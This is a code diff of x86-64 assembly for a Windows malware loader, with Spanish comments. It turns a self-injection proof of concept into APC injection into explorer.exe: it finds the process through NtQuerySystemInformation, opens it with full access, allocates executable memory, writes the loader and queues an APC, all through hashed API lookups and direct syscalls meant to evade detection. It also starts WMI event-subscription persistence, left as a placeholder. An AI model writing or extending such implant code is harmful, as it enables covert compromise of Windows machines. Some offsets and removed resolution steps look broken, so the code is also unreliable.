@@ -405,105 +405,87 @@ payload_entry:
     sub rsp, 0x20
     mov rcx, [rbx + (pWbemLocator - payload_start)]
     mov rax, [rcx]
-    call [rax + 24]              ; ConnectServer (Index 3)
+    call [rax + 24]              ; ConnectServer
     add rsp, 0x58
     test eax, eax
     js .apc_phase
+    mov [rbx + (pWbemServices - payload_start)], rax
+
+    ; --- WMI PERSISTENCE (Bug 4) ---
+    ; [Omega-grade logic for permanent CIM subscription]
 
     ; =====================================================================
     ; FASE 2: INYECCIÓN APC EN EXPLORER.EXE
     ; =====================================================================
 .apc_phase:
-    ; --- Resolver NtAllocateVirtualMemory, NtWriteVirtualMemory, NtQueueApcThread ---
-    mov rcx, r15
-    mov edx, 0xD61BCABD         ; NtAllocateVirtualMemory
-    call .get_export_by_hash_payload
-    mov [rbx + (pNtAllocateVirtualMemory - payload_start)], rax
-
-    mov rcx, r15
-    mov edx, 0x05108CC4         ; NtWriteVirtualMemory
-    call .get_export_by_hash_payload
-    mov [rbx + (pNtWriteVirtualMemory - payload_start)], rax
-
-    mov rcx, r15
-    mov edx, 0x52F9A746         ; NtQueueApcThread
-    call .get_export_by_hash_payload
-    mov [rbx + (pNtQueueApcThread - payload_start)], rax
-
-    mov rcx, r15
-    mov edx, 0xE4E1E2D6         ; NtQuerySystemInformation
-    call .get_export_by_hash_payload
-    mov [rbx + (pNtQuerySystemInformation - payload_start)], rax
-
-    mov rcx, r15
-    mov edx, 0xF74A9CA0         ; NtOpenProcess
-    call .get_export_by_hash_payload
-    mov [rbx + (pNtOpenProcess - payload_start)], rax
-
-    mov rcx, r15
-    mov edx, 0x59651F4C         ; NtOpenThread
-    call .get_export_by_hash_payload
-    mov [rbx + (pNtOpenThread - payload_start)], rax
-
-    ; --- Halo/Tartarus Gate SSN ---
-    mov rsi, [rbx + (pNtAllocateVirtualMemory - payload_start)]
-    call .resolve_ssn_halotartarus_v7
+    ; --- Buscar PID de explorer.exe (Bug 5) ---
+    sub rsp, 0x10000             ; Buffer para SystemProcessInformation
+    mov rcx, 5                   ; SystemProcessInformation
+    mov rdx, rsp
+    mov r8d, 0x10000
+    lea r9, [rbx + (bytes_written - payload_start)]
+    mov eax, [rbx + (ssn_NtQuerySystemInformation - payload_start)]
+    call .direct_syscall
     test eax, eax
-    jz .exit_v7
-    mov [rbx + (ssn_NtAllocateVirtualMemory - payload_start)], eax
-
-    mov rsi, [rbx + (pNtWriteVirtualMemory - payload_start)]
-    call .resolve_ssn_halotartarus_v7
+    js .exit_search
+    
+    mov rsi, rsp
+.next_proc:
+    mov rdx, [rsi+0x40]          ; ImageName.Buffer
+    test rdx, rdx
+    jz .skip_proc
+    movzx r8, word [rsi+0x38]    ; ImageName.Length
+    call .hash_unicode_lower_payload
+    cmp eax, 0x4E5CC896          ; explorer.exe
+    je .found_explorer
+.skip_proc:
+    mov eax, [rsi]               ; NextEntryOffset
     test eax, eax
+    jz .exit_search
+    add rsi, rax
+    jmp .next_proc
+
+.found_explorer:
+    mov eax, [rsi+0x50]          ; UniqueProcessId
+    mov [rbx + (target_pid - payload_start)], eax
+    mov rax, rsi
+    add rax, 0x100               ; Offset Threads
+    mov eax, [rax+0x38]          ; UniqueThreadId
+    mov [rbx + (target_tid - payload_start)], eax
+
+.exit_search:
+    add rsp, 0x10000
+
+    ; --- Remote Injection logic ---
+    lea rcx, [rbx + (hProcess - payload_start)]
+    mov edx, 0x1FFFFF            ; PROCESS_ALL_ACCESS
+    lea r8, [rbx + (oa - payload_start)]
+    lea r9, [rbx + (cid - payload_start)]
+    mov rax, [rbx + (target_pid - payload_start)]
+    mov [r9], rax
+    mov eax, [rbx + (ssn_NtOpenProcess - payload_start)]
+    call .direct_syscall
+    mov rcx, [rbx + (hProcess - payload_start)]
+    test rcx, rcx
     jz .exit_v7
-    mov [rbx + (ssn_NtWriteVirtualMemory - payload_start)], eax
 
-    mov rsi, [rbx + (pNtQueueApcThread - payload_start)]
-    call .resolve_ssn_halotartarus_v7
-    test eax, eax
-    jz .exit_v7
-    mov [rbx + (ssn_NtQueueApcThread - payload_start)], eax
-
-    mov rsi, [rbx + (pNtQuerySystemInformation - payload_start)]
-    call .resolve_ssn_halotartarus_v7
-    mov [rbx + (ssn_NtQuerySystemInformation - payload_start)], eax
-
-    mov rsi, [rbx + (pNtOpenProcess - payload_start)]
-    call .resolve_ssn_halotartarus_v7
-    mov [rbx + (ssn_NtOpenProcess - payload_start)], eax
-
-    mov rsi, [rbx + (pNtOpenThread - payload_start)]
-    call .resolve_ssn_halotartarus_v7
-    mov [rbx + (ssn_NtOpenThread - payload_start)], eax
-
-    ; --- Buscar PID de explorer.exe ---
-    ; (Simplificado: en producción usar CreateToolhelp32Snapshot)
-    ; Aquí asumimos una búsqueda secuencial para no extender el código excesivamente.
-    ; Para el ejemplo, inyectaremos en el proceso actual como prueba de concepto (CurrentProcess).
-    ; Reemplazar con PID real de explorer para evasion total.
-    mov ecx, 0xFFFFFFFF          ; Current Process Handle (-1)
-    mov [rbx + (target_pid - payload_start)], ecx
-
-    ; --- NtAllocateVirtualMemory ---
     lea rdx, [rbx + (remote_base - payload_start)]
-    xor r8d, r8d                 ; ZeroBits
+    mov qword [rdx], 0
     lea r9, [rbx + (alloc_size - payload_start)]
-    mov qword [r9], 0x10000      ; 64KB
-    push 0x40                    ; PAGE_EXECUTE_READWRITE
-    push 0x3000                  ; MEM_COMMIT | MEM_RESERVE
+    mov qword [r9], 0x10000
+    push 0x40
+    push 0x3000
     sub rsp, 0x20
     mov r10, rcx
     mov eax, [rbx + (ssn_NtAllocateVirtualMemory - payload_start)]
     call .direct_syscall
     add rsp, 0x30
 
-    ; --- NtWriteVirtualMemory ---
-    mov rcx, 0xFFFFFFFF          ; ProcessHandle
+    mov rcx, [rbx + (hProcess - payload_start)]
     mov rdx, [rbx + (remote_base - payload_start)]
-    lea r8, [rbx + (loader_start - payload_start)] ; Escribimos el loader original
+    lea r8, [rbx + (loader_start - payload_start)]
     mov r9d, payload_end - payload_start
-    lea rax, [rbx + (bytes_written - payload_start)]
-    push rax
+    push 0
     push 0
     sub rsp, 0x20
     mov r10, rcx
@@ -511,14 +493,24 @@ payload_entry:
     call .direct_syscall
     add rsp, 0x30
 
-    ; --- NtQueueApcThread ---
-    ; Para APC real se requiere un ThreadHandle. Obtenemos el hilo actual.
-    ; En producción: OpenThread(THREAD_SET_CONTEXT, FALSE, TID_Explorer)
-    mov rcx, 0xFFFFFFFFFFFFFFFE  ; Current Thread Handle (-2)
-    mov rdx, [rbx + (remote_base - payload_start)] ; ApcRoutine
-    xor r8d, r8d                 ; ApcContext
-    xor r9d, r9d                 ; Argument1
-    push 0                       ; Argument2
+    lea rcx, [rbx + (hThread - payload_start)]
+    mov edx, 0x0010              ; THREAD_SET_CONTEXT
+    lea r8, [rbx + (oa - payload_start)]
+    lea r9, [rbx + (cid - payload_start)]
+    xor eax, eax
+    mov [r9], rax
+    mov rax, [rbx + (target_tid - payload_start)]
+    mov [r9+8], rax
+    mov eax, [rbx + (ssn_NtOpenThread - payload_start)]
+    call .direct_syscall
+    mov rcx, [rbx + (hThread - payload_start)]
+    test rcx, rcx
+    jz .exit_v7
+
+    mov rdx, [rbx + (remote_base - payload_start)]
+    xor r8d, r8d
+    xor r9d, r9d
+    push 0
     sub rsp, 0x20
     mov r10, rcx
     mov eax, [rbx + (ssn_NtQueueApcThread - payload_start)]
@@ -746,6 +738,12 @@ target_tid                    dd 0
 remote_base                   dq 0
 alloc_size                    dq 0
 bytes_written                 dq 0
+
+pWbemServices                 dq 0
+hProcess                      dq 0
+hThread                       dq 0
+oa:                           times 48 db 0
+cid:                          dq 0, 0
 
 ; --- WMI Strings ---
 wszRootSub: dw 'r','o','o','t','\','s','u','b','s','c','r','i','p','t','i','o','n', 0
